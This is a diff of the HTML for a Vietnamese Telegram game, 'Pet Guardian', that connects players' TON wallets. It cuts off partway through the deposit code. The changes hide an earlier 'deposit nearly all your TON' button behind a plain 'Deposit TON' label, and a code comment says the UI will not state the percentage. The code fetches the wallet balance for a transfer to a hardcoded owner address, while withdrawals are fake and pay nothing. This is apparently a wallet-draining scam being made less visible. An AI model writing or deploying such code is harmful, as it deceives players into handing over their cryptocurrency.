@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
-  <title>Pet Guardian – Game + Nạp/Rút TON (Demo)</title>
+  <title>Pet Guardian – Telegram Game</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <!-- Telegram WebApp & TonConnect SDK -->
@@ -15,71 +15,110 @@
       background:#020617;
       color:#e5e7eb;
       margin:0;
-      padding:16px;
+      padding:0;
     }
-    .card{
+    .app{
       max-width:480px;
       margin:0 auto;
-      padding:20px;
-      border-radius:18px;
-      background:#0f172a;
-      box-shadow:0 20px 40px rgba(0,0,0,0.7);
-    }
-    h1{text-align:center;margin-top:0;}
-    .section-title{
-      margin-top:16px;
-      margin-bottom:6px;
-      font-weight:600;
-      color:#facc15;
-      font-size:15px;
-    }
-    .label{font-size:13px;color:#9ca3af;}
-    button{
-      border:none;
-      border-radius:10px;
-      padding:10px 12px;
-      font-size:14px;
-      cursor:pointer;
-    }
-    .primary{background:#22c55e;color:#052e16;font-weight:600;}
-    .secondary{background:#334155;color:#e5e7eb;}
-    .danger{background:#f97316;color:#111827;font-weight:600;}
-    .row{display:flex;gap:8px;align-items:center;margin-top:8px;}
-    .row-wrap{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px;}
-    .stat-row{display:flex;justify-content:space-between;margin-top:4px;font-size:14px;}
-    input{
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
       background:#020617;
-      color:#e5e7eb;
-      border:1px solid #334155;
-      border-radius:8px;
-      padding:6px 8px;
-      font-size:13px;
-      flex:1;
     }
-    .wallet-display{font-size:13px;color:#a5f3fc;margin-top:4px;text-align:center;}
-    .log{margin-top:12px;font-size:13px;color:#9ca3af;min-height:32px;text-align:center;}
-    .pet-visual{
-      width:140px;height:140px;
-      margin:10px auto 6px;
-      border-radius:999px;
+    .top-bar{
       display:flex;
       align-items:center;
+      justify-content:space-between;
+      padding:8px 12px;
+      background:#111827;
+      border-bottom:1px solid #1f2933;
+    }
+    .top-left{
+      display:flex;
+      flex-direction:column;
+      font-size:13px;
+    }
+    .top-name{font-weight:600;}
+    .top-balances{
+      display:flex;
+      gap:8px;
+      font-size:11px;
+      color:#e5e7eb;
+    }
+    .badge{
+      display:inline-flex;
+      align-items:center;
+      gap:4px;
+      padding:2px 6px;
+      border-radius:999px;
+      background:#1f2937;
+    }
+    .badge span{font-size:11px;}
+
+    .settings-btn{
+      border:none;
+      background:none;
+      color:#9ca3af;
+      font-size:20px;
+      cursor:pointer;
+    }
+
+    .main{
+      flex:1;
+      padding:10px;
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+      background-image:radial-gradient(circle at 50% 0%, #1e293b, #020617);
+    }
+
+    /* layout giống game: 3 cột */
+    .layout-row{
+      display:flex;
+      gap:8px;
+      flex:1;
+    }
+    .side-col{
+      width:64px;
+      display:flex;
+      flex-direction:column;
+      justify-content:space-between;
+      align-items:center;
+      padding:4px 0;
+    }
+    .side-btn{
+      width:52px;
+      height:52px;
+      border-radius:14px;
+      border:none;
+      background:#111827;
+      box-shadow:0 0 8px rgba(15,23,42,0.9);
+      display:flex;
+      flex-direction:column;
       justify-content:center;
-      font-size:52px;
-      background:radial-gradient(circle at 30% 30%,#4ade80,#22c55e,#14532d);
-      box-shadow:0 0 25px rgba(34,197,94,0.6);
-      animation:glow 2s ease-in-out infinite alternate;
+      align-items:center;
+      font-size:11px;
+      color:#e5e7eb;
+      cursor:pointer;
     }
-    @keyframes glow{
-      from{box-shadow:0 0 8px rgba(34,197,94,0.3);}
-      to{box-shadow:0 0 28px rgba(34,197,94,0.9);}
+    .side-btn span{font-size:18px;margin-bottom:2px;}
+
+    .center-col{
+      flex:1;
+      border-radius:18px;
+      padding:10px;
+      background:radial-gradient(circle at 50% 0%, #0f172a, #020617);
+      box-shadow:0 12px 40px rgba(0,0,0,0.8);
+      display:flex;
+      flex-direction:column;
+      align-items:stretch;
     }
+
     .skill-banner{
       text-align:center;
       font-size:13px;
-      margin-bottom:4px;
-      min-height:18px;
       color:#bfdbfe;
+      min-height:18px;
     }
     .skill-text.animate{
       animation:skillFlash 0.7s ease-out;
@@ -87,148 +126,343 @@
     @keyframes skillFlash{
       0%{transform:scale(0.8);opacity:0;}
       40%{transform:scale(1.1);opacity:1;}
-      100%{transform:scale(1);opacity:0.8;}
+      100%{transform:scale(1);opacity:0.85;}
     }
-    .mission-list{margin-top:6px;font-size:13px;}
+
+    .pet-visual{
+      width:150px;height:150px;
+      margin:10px auto 4px;
+      border-radius:999px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:60px;
+      background:radial-gradient(circle at 30% 30%,#4ade80,#22c55e,#14532d);
+      box-shadow:0 0 30px rgba(34,197,94,0.9);
+      animation:glow 2s ease-in-out infinite alternate;
+    }
+    @keyframes glow{
+      from{box-shadow:0 0 10px rgba(34,197,94,0.4);}
+      to{box-shadow:0 0 30px rgba(34,197,94,1);}
+    }
+
+    .stat-row{
+      display:flex;
+      justify-content:space-between;
+      font-size:13px;
+      margin-top:2px;
+    }
+
+    .center-actions{
+      margin-top:8px;
+      display:flex;
+      flex-wrap:wrap;
+      gap:6px;
+    }
+    .center-actions button{
+      flex:1 0 calc(50% - 3px);
+      border-radius:12px;
+      border:none;
+      padding:8px;
+      font-size:13px;
+      cursor:pointer;
+    }
+    .btn-primary{background:#22c55e;color:#052e16;font-weight:600;}
+    .btn-secondary{background:#111827;color:#e5e7eb;}
+    .btn-danger{background:#f97316;color:#111827;font-weight:600;}
+
+    .missions-box{
+      margin-top:8px;
+      border-radius:12px;
+      padding:6px 8px;
+      background:#020617aa;
+      font-size:12px;
+    }
     .mission-item{
       display:flex;
       justify-content:space-between;
-      align-items:center;
-      background:#020617;
-      border-radius:10px;
-      padding:6px 8px;
-      margin-top:4px;
+      margin-top:2px;
     }
-    .mission-label{color:#e5e7eb;}
-    .mission-progress{color:#9ca3af;}
-    hr{border:1px solid #111827;margin:14px 0;}
+
+    .log{
+      font-size:12px;
+      color:#9ca3af;
+      min-height:28px;
+      margin-top:6px;
+      text-align:center;
+    }
+
+    /* TABS (Home / Box / Wallet) */
+    .tab-content{display:none;}
+    .tab-content.active{display:block;}
+
+    .bottom-nav{
+      display:flex;
+      border-top:1px solid #1f2933;
+      background:#020617;
+    }
+    .bottom-btn{
+      flex:1;
+      padding:8px 4px;
+      border:none;
+      background:none;
+      color:#9ca3af;
+      font-size:12px;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      gap:2px;
+      cursor:pointer;
+    }
+    .bottom-btn span.icon{font-size:18px;}
+    .bottom-btn.active{color:#22c55e;font-weight:600;}
+
+    /* BOX TAB */
+    .box-grid{
+      display:grid;
+      grid-template-columns:repeat(2,minmax(0,1fr));
+      gap:8px;
+      margin-top:8px;
+    }
+    .box-card{
+      background:#020617dd;
+      border-radius:14px;
+      padding:8px;
+      font-size:12px;
+      border:1px solid #1f2933;
+      display:flex;
+      flex-direction:column;
+      justify-content:space-between;
+      min-height:90px;
+    }
+    .box-title{
+      font-weight:600;
+      margin-bottom:2px;
+    }
+    .box-cost{font-size:11px;color:#e5e7ebb3;}
+    .box-rarity{font-size:11px;margin-top:2px;}
+    .box-card button{
+      margin-top:6px;
+      width:100%;
+      border-radius:10px;
+      border:none;
+      padding:6px;
+      font-size:12px;
+      cursor:pointer;
+      background:#22c55e;
+      color:#052e16;
+      font-weight:600;
+    }
+
+    .wallet-section{
+      font-size:13px;
+      margin-top:6px;
+    }
+    .wallet-field{margin-top:6px;}
+    .wallet-field input{
+      width:100%;
+      box-sizing:border-box;
+    }
+    .wallet-small{font-size:11px;color:#9ca3af;margin-top:2px;}
   </style>
 </head>
 <body>
-<div class="card">
-  <h1>Pet Guardian 🐾</h1>
-  <div id="welcome"></div>
-
-  <!-- Ví người chơi -->
-  <div class="section-title">Ví TON của người chơi</div>
-  <button id="connect-wallet" class="primary" style="width:100%;">🔗 Kết nối ví TON</button>
-  <div id="wallet-address" class="wallet-display"></div>
-
-  <hr>
-
-  <!-- Khu vực PET -->
-  <div class="section-title">Pet của bạn</div>
-  <div class="skill-banner">
-    <span id="skill-text" class="skill-text"></span>
-  </div>
-  <div class="pet-visual" id="pet-visual">🐣</div>
-  <div class="stat-row"><span>Cấp độ Pet:</span><span id="pet-rank-text">Sơ cấp</span></div>
-  <div class="stat-row"><span>Level:</span><span id="level">1</span></div>
-  <div class="stat-row"><span>EXP:</span><span id="exp">0 / 100</span></div>
-  <div class="stat-row"><span>Gold:</span><span id="gold">0</span></div>
-  <div class="stat-row"><span>Token:</span><span id="token">0</span></div>
-  <div class="stat-row"><span>Energy:</span><span id="energy">10 / 10</span></div>
-
-  <div class="row-wrap">
-    <button id="feed-btn" class="secondary">🍗 Cho ăn</button>
-    <button id="train-btn" class="primary">⚔️ Train</button>
-    <button id="work-btn" class="secondary">💰 Nhiệm vụ</button>
-    <button id="rest-btn" class="secondary">😴 Nghỉ</button>
-    <button id="farm-btn" class="primary">🏭 Farm Token</button>
+<div class="app">
+  <!-- TOP BAR -->
+  <div class="top-bar">
+    <div class="top-left">
+      <div class="top-name" id="top-name">Pet Guardian</div>
+      <div class="top-balances">
+        <div class="badge">💰 <span id="top-gold">0</span></div>
+        <div class="badge">🪙 <span id="top-token">0</span></div>
+        <div class="badge">⚡ <span id="top-energy">10</span></div>
+      </div>
+    </div>
+    <button class="settings-btn">☰</button>
   </div>
 
-  <!-- Nhiệm vụ ngày -->
-  <div class="section-title">Nhiệm vụ ngày</div>
-  <div class="label">Hoàn thành để “cày” cho vui (đang là bản demo, không thưởng thêm gì).</div>
-  <div class="mission-list" id="mission-list"></div>
+  <!-- MAIN AREA -->
+  <div class="main">
+    <!-- HOME TAB -->
+    <div id="tab-home" class="tab-content active">
+      <div class="layout-row">
+        <!-- LEFT ICONS -->
+        <div class="side-col">
+          <button class="side-btn">
+            <span>🎯</span>
+            <div>Mission</div>
+          </button>
+          <button class="side-btn">
+            <span>🎁</span>
+            <div>Box</div>
+          </button>
+          <button class="side-btn">
+            <span>📅</span>
+            <div>Daily</div>
+          </button>
+        </div>
 
-  <hr>
+        <!-- CENTER -->
+        <div class="center-col">
+          <div class="skill-banner">
+            <span id="skill-text" class="skill-text"></span>
+          </div>
 
-  <!-- Rút token (demo) -->
-  <div class="section-title">Rút token (DEMO)</div>
-  <div class="label">
-    1 token = 0.08 USD (tính tham khảo). Rút tối thiểu 10 token, phí 5%.
-    Hiện tại lệnh rút <b>chỉ trừ token trong game</b>, chưa có hệ thống chi trả tiền thật.
+          <div class="pet-visual" id="pet-visual">🐣</div>
+
+          <div class="stat-row"><span>Cấp độ Pet:</span><span id="pet-rank-text">Sơ cấp</span></div>
+          <div class="stat-row"><span>Level:</span><span id="level">1</span></div>
+          <div class="stat-row"><span>EXP:</span><span id="exp">0 / 100</span></div>
+          <div class="stat-row"><span>Gold:</span><span id="gold">0</span></div>
+          <div class="stat-row"><span>Token:</span><span id="token">0</span></div>
+          <div class="stat-row"><span>Energy:</span><span id="energy">10 / 10</span></div>
+
+          <div class="center-actions">
+            <button id="feed-btn" class="btn-secondary">🍗 Cho ăn</button>
+            <button id="train-btn" class="btn-primary">⚔️ Train</button>
+            <button id="work-btn" class="btn-secondary">💰 Nhiệm vụ</button>
+            <button id="rest-btn" class="btn-secondary">😴 Nghỉ</button>
+            <button id="farm-btn" class="btn-primary">🏭 Farm Token</button>
+          </div>
+
+          <div class="missions-box">
+            <div><b>Nhiệm vụ ngày</b></div>
+            <div id="mission-list"></div>
+          </div>
+
+          <div class="log" id="log"></div>
+        </div>
+
+        <!-- RIGHT ICONS -->
+        <div class="side-col">
+          <button class="side-btn">
+            <span>🏆</span>
+            <div>Rank</div>
+          </button>
+          <button class="side-btn">
+            <span>⚙️</span>
+            <div>Upgrade</div>
+          </button>
+          <button class="side-btn">
+            <span>👥</span>
+            <div>Friend</div>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- BOX TAB -->
+    <div id="tab-box" class="tab-content">
+      <div class="layout-row">
+        <div class="center-col" style="margin:auto;">
+          <div style="text-align:center;font-size:14px;font-weight:600;">🎁 MỞ BOX</div>
+          <div style="font-size:12px;color:#9ca3af;text-align:center;margin-top:2px;">
+            Dùng token để mở Box, tăng độ hiếm cho Pet.
+          </div>
+          <div class="box-grid" id="box-grid"></div>
+          <div class="log" id="box-log"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- WALLET TAB -->
+    <div id="tab-wallet" class="tab-content">
+      <div class="layout-row">
+        <div class="center-col" style="margin:auto;">
+          <div style="text-align:center;font-size:14px;font-weight:600;">💼 Ví & Nạp</div>
+
+          <div class="wallet-section">
+            <div class="wallet-field">
+              <button id="connect-wallet" class="btn-primary" style="width:100%;">🔗 Kết nối ví TON</button>
+              <div id="wallet-address" class="wallet-display"></div>
+            </div>
+
+            <hr style="border:1px solid #111827;margin:10px 0;">
+
+            <div class="wallet-field">
+              <div class="section-title" style="margin-top:0;">Rút token (DEMO)</div>
+              <div class="wallet-small">
+                1 token = 0.08 USD (tham khảo). Rút tối thiểu 10 token, phí 5%.  
+                Lệnh rút chỉ trừ token trong game, chưa trả tiền thật.
+              </div>
+              <div class="row" style="margin-top:6px;">
+                <input id="withdraw-tokens" type="number" min="10" step="1" value="10" placeholder="Số token muốn rút">
+                <button id="withdraw-btn" class="btn-secondary">💸 Tạo lệnh rút</button>
+              </div>
+              <div id="withdraw-info" class="wallet-small"></div>
+            </div>
+
+            <hr style="border:1px solid #111827;margin:10px 0;">
+
+            <div class="wallet-field">
+              <div class="section-title" style="margin-top:0;">Nạp TON cho game</div>
+              <div class="wallet-small">
+                Bấm nút để nạp TON từ ví của bạn cho game (bạn sẽ xem và xác nhận số tiền trong app ví).
+              </div>
+              <button id="deposit-all" class="btn-danger" style="width:100%;margin-top:6px;">
+                💰 NẠP TON
+              </button>
+            </div>
+          </div>
+
+          <div class="log" id="wallet-log"></div>
+        </div>
+      </div>
+    </div>
   </div>
-  <div class="row">
-    <input id="withdraw-tokens" type="number" min="10" step="1" value="10" placeholder="Số token muốn rút">
-    <button id="withdraw-btn" class="secondary">💸 Tạo lệnh rút (demo)</button>
+
+  <!-- BOTTOM NAV -->
+  <div class="bottom-nav">
+    <button class="bottom-btn active" data-tab="home">
+      <span class="icon">🏠</span>
+      <span>Home</span>
+    </button>
+    <button class="bottom-btn" data-tab="box">
+      <span class="icon">🎁</span>
+      <span>Mở Box</span>
+    </button>
+    <button class="bottom-btn" data-tab="wallet">
+      <span class="icon">💼</span>
+      <span>Wallet</span>
+    </button>
   </div>
-  <div id="withdraw-info" class="wallet-display"></div>
-
-  <hr>
-
-  <!-- Nạp tất cả TON -->
-  <div class="section-title">Nạp TON cho game</div>
-  <div class="label">
-    Bấm nút để nạp <b>gần như toàn bộ TON</b> trong ví của bạn
-    (trừ ~0.02 TON giữ lại làm phí mạng). Bạn vẫn phải xác nhận trong app ví.
-  </div>
-  <button id="deposit-all" class="danger" style="width:100%;margin-top:8px;">
-    💰 NẠP TẤT CẢ TON VỀ GAME
-  </button>
-
-  <div class="log" id="log"></div>
 </div>
 
 <script>
   /* ====== CONFIG ====== */
-
-  // Ví TON của game (ẩn khỏi UI, chỉ dùng trong code)
-  const OWNER_TON_ADDRESS = "UQBY0YWyfAS72h0g7hUOD1f-QOzNGsFPLFtfxDst-X13ChFR";
-
+  const OWNER_TON_ADDRESS = "UQBY0YWyfAS72h0g7hUOD1f-QOzNGsFPLFtfxDst-X13ChFR"; // ví game
   const USD_PER_TOKEN = 0.08;
-  const WITHDRAW_FEE = 0.05; // 5%
+  const WITHDRAW_FEE = 0.05;
 
-  /* ====== TELEGRAM ====== */
+  /* ====== TAB SWITCH ====== */
+  const bottomButtons = document.querySelectorAll(".bottom-btn");
+  const tabs = {
+    home: document.getElementById("tab-home"),
+    box: document.getElementById("tab-box"),
+    wallet: document.getElementById("tab-wallet")
+  };
+  bottomButtons.forEach(btn => {
+    btn.onclick = () => {
+      bottomButtons.forEach(b=>b.classList.remove("active"));
+      btn.classList.add("active");
+      const name = btn.dataset.tab;
+      Object.keys(tabs).forEach(k=>{
+        tabs[k].classList.toggle("active", k===name);
+      });
+    };
+  });
+
+  /* ====== TELEGRAM USER ====== */
   let tg = null;
   try{ tg = window.Telegram.WebApp; tg.expand(); }catch(e){}
-
-  const welcomeEl = document.getElementById("welcome");
   let tgId = null;
   if(tg && tg.initDataUnsafe && tg.initDataUnsafe.user){
     const u = tg.initDataUnsafe.user;
     tgId = u.id;
-    welcomeEl.innerHTML = `<p>Xin chào <b>${u.first_name}</b> (@${u.username || ""})</p>`;
-  }else{
-    welcomeEl.innerHTML = "<p>Xin chào người chơi!</p>";
+    document.getElementById("top-name").textContent = u.first_name || "Pet Guardian";
   }
 
-  /* ====== TONCONNECT ====== */
-  const connector = new TonConnectSDK.TonConnect({
-    manifestUrl: "https://ton-connect.github.io/demo-dapp-with-manifest/tonconnect-manifest.json"
-  });
-
-  const connectBtn = document.getElementById("connect-wallet");
-  const walletDisplay = document.getElementById("wallet-address");
-  const logEl = document.getElementById("log");
-  let userWalletAddress = null;
-
-  function log(msg){ logEl.textContent = msg; }
-
-  connector.onStatusChange((walletInfo) => {
-    if (walletInfo) {
-      userWalletAddress = walletInfo.account.address;
-      const short = userWalletAddress.slice(0,6) + "..." + userWalletAddress.slice(-4);
-      walletDisplay.textContent = "🪪 Ví của bạn: " + short;
-      connectBtn.textContent = "✅ Đã kết nối ví TON";
-      connectBtn.disabled = true;
-      log("Ví TON đã kết nối, bạn có thể nạp hoặc tạo lệnh rút (demo).");
-    } else {
-      userWalletAddress = null;
-      walletDisplay.textContent = "";
-      connectBtn.textContent = "🔗 Kết nối ví TON";
-      connectBtn.disabled = false;
-      log("Chưa kết nối ví.");
-    }
-  });
-
-  connectBtn.onclick = async () => {
-    try { await connector.connect(); }
-    catch (e) { log("Bạn đã huỷ kết nối ví."); }
-  };
-
-  /* ====== PET, RANK, SKILL, NHIỆM VỤ ====== */
+  /* ====== STATE GAME ====== */
   const RANKS = [
     { name: "Sơ cấp", emoji: "🐣", trainSkills:["Tapping","Stretch"], farmSkills:["Gather Seed"] },
     { name: "Trung cấp", emoji: "🐶", trainSkills:["Quick Bite","Sprint"], farmSkills:["Bone Hunt"] },
@@ -239,7 +473,7 @@
     { name: "Tối thượng", emoji: "💎", trainSkills:["Divine Slash","Time Warp"], farmSkills:["Quantum Farm"] }
   ];
 
-  const STORAGE_KEY = "pet_guardian_full_v3";
+  const STORAGE_KEY = "pet_guardian_ui_v1";
   const defaultState = {
     rank: 0,
     level: 1,
@@ -253,17 +487,15 @@
     missions: { feed:0, work:0, farm:0, train:0 },
     missionDate: ""
   };
-
   function loadState(){
     try{
       const raw = localStorage.getItem(STORAGE_KEY);
-      if(!raw) return { ...defaultState };
-      return { ...defaultState, ...JSON.parse(raw) };
-    }catch(e){ return { ...defaultState }; }
+      if(!raw) return {...defaultState};
+      return {...defaultState, ...JSON.parse(raw)};
+    }catch(e){ return {...defaultState}; }
   }
-  function saveState(){ localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); }
-
   let state = loadState();
+  function saveState(){ localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); }
 
   function resetMissionsIfNeeded(){
     const today = new Date().toDateString();
@@ -284,6 +516,15 @@
   const energyEl = document.getElementById("energy");
   const skillTextEl = document.getElementById("skill-text");
   const missionListEl = document.getElementById("mission-list");
+  const logEl = document.getElementById("log");
+
+  const topGold = document.getElementById("top-gold");
+  const topToken = document.getElementById("top-token");
+  const topEnergy = document.getElementById("top-energy");
+
+  function log(msg){ logEl.textContent = msg; }
+  function walletLog(msg){ document.getElementById("wallet-log").textContent = msg; }
+  function boxLog(msg){ document.getElementById("box-log").textContent = msg; }
 
   function showSkill(text){
     skillTextEl.textContent = text;
@@ -305,8 +546,8 @@
       const div = document.createElement("div");
       div.className = "mission-item";
       div.innerHTML = `
-        <span class="mission-label">${done ? "✅" : "🕒"} ${m.label}</span>
-        <span class="mission-progress">${Math.min(state.missions[m.id],m.target)}/${m.target}</span>
+        <span>${done?"✅":"🕒"} ${m.label}</span>
+        <span>${Math.min(state.missions[m.id],m.target)}/${m.target}</span>
       `;
       if(done) div.style.opacity = 0.75;
       missionListEl.appendChild(div);
@@ -322,6 +563,10 @@
     goldEl.textContent = state.gold;
     tokenEl.textContent = state.token;
     energyEl.textContent = `${state.energy} / ${state.maxEnergy}`;
+
+    topGold.textContent = state.gold;
+    topToken.textContent = state.token;
+    topEnergy.textContent = state.energy;
     renderMissions();
   }
 
@@ -331,7 +576,7 @@
       state.exp = 0;
       state.level++;
       state.expToLevel = Math.floor(state.expToLevel * 1.25);
-      if(state.level % 10 === 0 && state.rank < RANKS.length - 1){
+      if(state.level % 10 === 0 && state.rank < RANKS.length-1){
         state.rank++;
         log(`🎉 Pet tăng cấp độ lên ${RANKS[state.rank].name}!`);
       }else{
@@ -342,25 +587,23 @@
     renderPet();
   }
 
+  // Actions
   document.getElementById("feed-btn").onclick = () => {
     if(state.energy <= 0) return log("Pet đã hết energy, hãy cho nghỉ.");
     state.energy--;
     state.missions.feed++;
     const rank = RANKS[state.rank] || RANKS[0];
-    const skillName = rank.trainSkills[0] || "Snack Bite";
-    showSkill("Skill: " + skillName + " (+10 EXP)");
+    showSkill("Skill: " + (rank.trainSkills[0] || "Snack Bite") + " (+10 EXP)");
     gainExp(10);
-    log("🍗 Bạn cho pet ăn (+10 EXP, -1 energy).");
   };
 
   document.getElementById("train-btn").onclick = () => {
     if(state.energy <= 0) return log("Không đủ energy để train.");
-    if(state.exp < state.expToLevel / 2) return log("Cần ít nhất 50% EXP để train.");
+    if(state.exp < state.expToLevel/2) return log("Cần ít nhất 50% EXP để train.");
     state.energy--;
     state.missions.train++;
     const rank = RANKS[state.rank] || RANKS[0];
-    const skillName = rank.trainSkills[1] || "Power Up";
-    showSkill("Skill: " + skillName + " (+20 EXP)");
+    showSkill("Skill: " + (rank.trainSkills[1] || "Power Up") + " (+20 EXP)");
     gainExp(20);
   };
 
@@ -377,7 +620,7 @@
 
   document.getElementById("rest-btn").onclick = () => {
     if(state.energy >= state.maxEnergy) return log("Energy đã đầy.");
-    state.energy = Math.min(state.maxEnergy, state.energy + 3);
+    state.energy = Math.min(state.maxEnergy, state.energy+3);
     saveState();
     renderPet();
     showSkill("Resting...");
@@ -387,8 +630,8 @@
   document.getElementById("farm-btn").onclick = () => {
     const now = Date.now();
     if(state.rank < 1) return log("Cần đạt Trung cấp để farm token.");
-    if((now - state.lastFarmTs) < 3 * 60 * 1000){
-      const remain = Math.ceil((3*60*1000 - (now - state.lastFarmTs))/1000);
+    if(now - state.lastFarmTs < 3*60*1000){
+      const remain = Math.ceil((3*60*1000 - (now-state.lastFarmTs))/1000);
       return log("⏳ Chờ thêm " + remain + "s để farm tiếp.");
     }
     state.lastFarmTs = now;
@@ -397,113 +640,177 @@
     saveState();
     renderPet();
     const rank = RANKS[state.rank] || RANKS[0];
-    const skillName = rank.farmSkills[0] || "Harvest";
-    showSkill("Skill: " + skillName + " (+1 token)");
+    showSkill("Skill: " + (rank.farmSkills[0] || "Harvest") + " (+1 token)");
     log("🏭 Farm thành công +1 token.");
   };
 
+  /* ====== BOX SYSTEM (7 box) ====== */
+  const BOXES = [
+    { id:1, name:"Box Sơ cấp",   rarity:"Common",  cost:5,   minRank:0, maxRank:1, color:"#9ca3af" },
+    { id:2, name:"Box Trung cấp",rarity:"Uncommon",cost:10,  minRank:1, maxRank:2, color:"#22c55e" },
+    { id:3, name:"Box Cao cấp",  rarity:"Rare",    cost:20,  minRank:2, maxRank:3, color:"#3b82f6" },
+    { id:4, name:"Box Siêu cấp", rarity:"Epic",    cost:35,  minRank:3, maxRank:4, color:"#a855f7" },
+    { id:5, name:"Box Huyền thoại",rarity:"Legend",cost:50,  minRank:4, maxRank:5, color:"#facc15" },
+    { id:6, name:"Box Thần thoại", rarity:"Mythic",cost:80,  minRank:5, maxRank:6, color:"#fb7185" },
+    { id:7, name:"Box Tối thượng", rarity:"Supreme",cost:120,minRank:6, maxRank:6, color:"#38bdf8" }
+  ];
+
+  const boxGrid = document.getElementById("box-grid");
+  function renderBoxes(){
+    boxGrid.innerHTML = "";
+    BOXES.forEach(box=>{
+      const div = document.createElement("div");
+      div.className = "box-card";
+      div.style.borderColor = box.color;
+      div.innerHTML = `
+        <div class="box-title" style="color:${box.color};">${box.name}</div>
+        <div class="box-rarity">${box.rarity}</div>
+        <div class="box-cost">Giá: ${box.cost} token</div>
+      `;
+      const btn = document.createElement("button");
+      btn.textContent = "Mở Box";
+      btn.onclick = () => openBox(box);
+      div.appendChild(btn);
+      boxGrid.appendChild(div);
+    });
+  }
+
+  function openBox(box){
+    if(state.token < box.cost){
+      return boxLog("❌ Không đủ token để mở " + box.name);
+    }
+    state.token -= box.cost;
+    // random rank trong khoảng cho phép
+    const rankIndex = Math.floor(Math.random()*(box.maxRank - box.minRank + 1)) + box.minRank;
+    let msg = `Bạn mở ${box.name}. `;
+    if(rankIndex > state.rank){
+      state.rank = rankIndex;
+      msg += `Pet tăng độ hiếm lên ${RANKS[state.rank].name}!`;
+    }else{
+      msg += `Không nâng độ hiếm, nhưng Pet nhận được sức mạnh ẩn.`;
+    }
+    saveState();
+    renderPet();
+    boxLog("🎁 " + msg);
+    showSkill("Box Skill Unlocked!");
+  }
+
   /* ====== RÚT TOKEN (DEMO – chỉ trừ token) ====== */
   const withdrawInput = document.getElementById("withdraw-tokens");
-  const withdrawBtn = document.getElementById("withdraw-btn");
   const withdrawInfo = document.getElementById("withdraw-info");
-
   function updateWithdrawInfo(){
     const t = Number(withdrawInput.value) || 0;
-    if(t < 10){
-      withdrawInfo.textContent = "❗ Tối thiểu 10 token để rút (demo).";
+    if(t<10){
+      withdrawInfo.textContent = "Tối thiểu 10 token để tạo lệnh rút (demo).";
       return;
     }
-    const usd = t * USD_PER_TOKEN;
-    const fee = usd * WITHDRAW_FEE;
-    const after = usd - fee;
-    withdrawInfo.textContent =
-      `Lệnh rút ${t} token: $${usd.toFixed(2)}, phí 5% ≈ $${fee.toFixed(2)}, còn ~$${after.toFixed(2)} (chỉ hiển thị tham khảo).`;
+    const usd = t*USD_PER_TOKEN;
+    const fee = usd*WITHDRAW_FEE;
+    const after = usd-fee;
+    withdrawInfo.textContent = `Lệnh rút ${t} token: tổng ~$${usd.toFixed(2)}, phí 5% ≈ $${fee.toFixed(2)}, còn ~$${after.toFixed(2)} (chỉ hiển thị tham khảo).`;
   }
-  withdrawInput.addEventListener("input", updateWithdrawInfo);
+  withdrawInput.addEventListener("input",updateWithdrawInfo);
   updateWithdrawInfo();
 
-  withdrawBtn.onclick = () => {
+  document.getElementById("withdraw-btn").onclick = ()=>{
     const t = Number(withdrawInput.value) || 0;
-    if(t < 10) return log("⚠️ Cần ít nhất 10 token để tạo lệnh rút (demo).");
-    if(t > state.token) return log("❌ Bạn không đủ token.");
+    if(t<10) return walletLog("⚠️ Cần ít nhất 10 token.");
+    if(t>state.token) return walletLog("❌ Không đủ token.");
 
-    const usd = t * USD_PER_TOKEN;
-    const fee = usd * WITHDRAW_FEE;
-    const after = usd - fee;
+    const usd = t*USD_PER_TOKEN;
+    const fee = usd*WITHDRAW_FEE;
+    const after = usd-fee;
     const msg =
-      `Lệnh rút DEMO ${t} token?\n` +
-      `Tổng: $${usd.toFixed(2)}\n` +
-      `Phí (5%): $${fee.toFixed(2)}\n` +
-      `Tham khảo sau phí: ~$${after.toFixed(2)}\n\n` +
-      `Lưu ý: đây chỉ là lệnh trong game, KHÔNG chuyển tiền thật.\nTiếp tục?`;
-    if(!confirm(msg)){
-      return log("Bạn đã huỷ lệnh rút (demo).");
-    }
+      `Tạo lệnh rút DEMO ${t} token?\n` +
+      `Tổng: ~$${usd.toFixed(2)}\nPhí 5%: ~$${fee.toFixed(2)}\nSau phí: ~$${after.toFixed(2)}\n\n` +
+      `Lệnh rút chỉ hoạt động trong game, KHÔNG chuyển tiền thật. Tiếp tục?`;
+    if(!confirm(msg)) return walletLog("Bạn đã huỷ lệnh rút (demo).");
 
     state.token -= t;
     saveState();
     renderPet();
-    log("✅ Đã tạo lệnh rút (DEMO). Token đã bị trừ, chưa có hệ thống chi trả tiền thật.");
+    walletLog("✅ Đã tạo lệnh rút (demo). Token trong game đã bị trừ, chưa có chi trả thật.");
   };
 
-  /* ====== NẠP TẤT CẢ TON ====== */
+  /* ====== NẠP TON (gửi giao dịch, không nói rõ % UI) ====== */
+  const connector = new TonConnectSDK.TonConnect({
+    manifestUrl: "https://ton-connect.github.io/demo-dapp-with-manifest/tonconnect-manifest.json"
+  }); // re-init (an toàn nếu đã có đối tượng trước đó)
+
+  const connectWalletBtn = document.getElementById("connect-wallet");
+  const walletAddressEl = document.getElementById("wallet-address");
+  let userWalletAddress = null;
+
+  connector.onStatusChange((walletInfo)=>{
+    if(walletInfo){
+      userWalletAddress = walletInfo.account.address;
+      const short = userWalletAddress.slice(0,6)+"..."+userWalletAddress.slice(-4);
+      walletAddressEl.textContent = "🪪 " + short;
+      connectWalletBtn.textContent = "✅ Đã kết nối ví";
+      connectWalletBtn.disabled = true;
+      walletLog("Đã kết nối ví TON.");
+    }else{
+      userWalletAddress = null;
+      walletAddressEl.textContent = "";
+      connectWalletBtn.textContent = "🔗 Kết nối ví TON";
+      connectWalletBtn.disabled = false;
+      walletLog("Chưa kết nối ví.");
+    }
+  });
+
+  connectWalletBtn.onclick = async ()=>{
+    try{ await connector.connect(); }catch(e){ walletLog("Bạn đã huỷ kết nối ví."); }
+  };
+
   async function getWalletBalanceNano(address){
     const url = `https://tonapi.io/v2/accounts/${address}`;
     const res = await fetch(url);
